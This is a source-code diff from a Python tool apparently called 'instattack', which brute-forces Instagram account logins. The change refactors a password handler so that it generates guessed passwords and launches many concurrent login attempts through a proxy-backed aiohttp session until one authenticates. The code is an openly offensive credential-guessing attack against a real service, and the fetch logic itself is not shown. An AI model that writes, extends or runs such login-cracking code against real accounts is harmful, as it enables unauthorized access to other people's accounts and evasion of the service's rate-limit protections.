@@ -7,6 +7,7 @@ from instattack import settings
 from instattack.exceptions import ResultNotInResponse, InstagramResultError
 from instattack.models import InstagramResult, LoginAttemptContext, LoginContext
 
+from .utils import starting, stopping
 from .base import RequestHandler
 
 
@@ -94,9 +95,10 @@ class PasswordHandler(RequestHandler):
 
     async def prepopulate(self, loop, password_limit=None):
         self.log.info('Prepopulating Passwords')
-        for password in self.user.get_new_attempts(limit=password_limit):
+        async for password in self.user.generate_attempts(loop, limit=password_limit):
             await self.passwords.put(password)
 
+    @starting
     async def run(self, loop, token, progress=False, password_limit=None):
         """
         A stop event is required since if the results handler notices that we
@@ -119,64 +121,63 @@ class PasswordHandler(RequestHandler):
             result = await res
             await self.results.put(result)
         """
-        async with self.starting(loop):
-            await self.prepopulate(loop, password_limit=password_limit)
+        await self.prepopulate(loop, password_limit=password_limit)
 
-            if self.passwords.qsize() == 0:
-                self.log.error('No Passwords to Try')
-                return
+        if self.passwords.qsize() == 0:
+            self.log.error('No Passwords to Try')
+            return
 
-            # progress = OptionalProgressbar(label='Attempting Login',
-            #     max_value=self.passwords.qsize())
+        # progress = OptionalProgressbar(label='Attempting Login',
+        #     max_value=self.passwords.qsize())
 
-            def task_done(fut):
-                result = fut.result()
-                if not result or not result.conclusive:
-                    raise InstagramResultError("Result should be valid and conslusive.")
+        def task_done(fut):
+            result = fut.result()
+            if not result or not result.conclusive:
+                raise InstagramResultError("Result should be valid and conslusive.")
 
-                # TODO: Make sure we do not run into any threading issues with this
-                # potentially not being thread safe.
-                self.results.put_nowait(result)
+            # TODO: Make sure we do not run into any threading issues with this
+            # potentially not being thread safe.
+            self.results.put_nowait(result)
 
-                # progress.update()
+            # progress.update()
 
-            tasks = []
-            with self.log.start_and_done('Consuming Passwords'):
+        tasks = []
+        with self.log.start_and_done('Consuming Passwords'):
 
-                async with aiohttp.ClientSession(
-                    connector=self._connector,
-                    timeout=self._timeout
-                ) as session:
-                    index = 0
-                    while not self.passwords.empty() and not self.auth_result_found.is_set():
-                        password = await self.passwords.get()
-                        context = LoginContext(index=index, token=token, password=password)
+            async with aiohttp.ClientSession(
+                connector=self._connector,
+                timeout=self._timeout
+            ) as session:
+                index = 0
+                while not self.passwords.empty() and not self.auth_result_found.is_set():
+                    password = await self.passwords.get()
+                    context = LoginContext(index=index, token=token, password=password)
 
-                        task = asyncio.create_task(self.fetch(session, context))
-                        task.add_done_callback(task_done)
-                        tasks.append(task)
+                    task = asyncio.create_task(self.fetch(session, context))
+                    task.add_done_callback(task_done)
+                    tasks.append(task)
 
-                    self.log.debug(f'Awaiting {len(tasks)} Password Tasks...')
-                    await asyncio.gather(*tasks)
+                self.log.debug(f'Awaiting {len(tasks)} Password Tasks...')
+                await asyncio.gather(*tasks)
 
-            # progress.finish()
+        # progress.finish()
 
+    @stopping
     async def stop(self, loop):
-        async with self.stopping(loop):
-            # Triggered by results handler if it notices an authenticated result.
-            # Note that we can also just check `if self.stopped`.
-            if self.stop_event.is_set():
-                # Here we might want to cancel outstanding tasks that we are awaiting.
+        # Triggered by results handler if it notices an authenticated result.
+        # Note that we can also just check `if self.stopped`.
+        if self.stop_event.is_set():
+            # Here we might want to cancel outstanding tasks that we are awaiting.
 
-                # Proxy handler will stop on it's own if the limit of proxies
-                # has been reached, however we want to make sure to stop it
-                # if we found an authenticated result.
-                await self.proxy_handler.stop(loop)
+            # Proxy handler will stop on it's own if the limit of proxies
+            # has been reached, however we want to make sure to stop it
+            # if we found an authenticated result.
+            await self.proxy_handler.stop(loop)
 
-            # Triggered by No More Passwords - No Authenticated Result
-            else:
-                # Stop Results Consumer
-                await self.results.put(None)
+        # Triggered by No More Passwords - No Authenticated Result
+        else:
+            # Stop Results Consumer
+            await self.results.put(None)
 
     async def fetch(self, session, parent_context):
         """
